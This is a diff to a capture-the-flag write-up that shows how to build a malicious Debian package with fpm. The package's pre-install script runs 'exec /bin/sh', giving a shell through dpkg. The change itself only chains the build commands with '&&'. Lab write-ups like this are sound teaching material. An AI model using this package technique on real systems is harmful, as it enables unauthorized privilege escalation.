@@ -101,8 +101,8 @@ Doing a search on for dpkg on [gtfobins](https://gtfobins.github.io/gtfobins/dpk
 Now the way this is going to work is that we would build a malcious debian package and then we try installing the package which will run our malicious code embedded in the package.<br>
 Steps to building malicious package.
 1. Install fpm: `sudo apt install ruby && sudo gem install fpm`
-2. Build package with fpm: ```TF=$(mktemp -d)
-echo 'exec /bin/sh' > $TF/x.sh
+2. Build package with fpm: ```TF=$(mktemp -d) &&
+echo 'exec /bin/sh' > $TF/x.sh &&
 fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF```
 ![mal deb package](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/creating_mal_packgae.png)
 
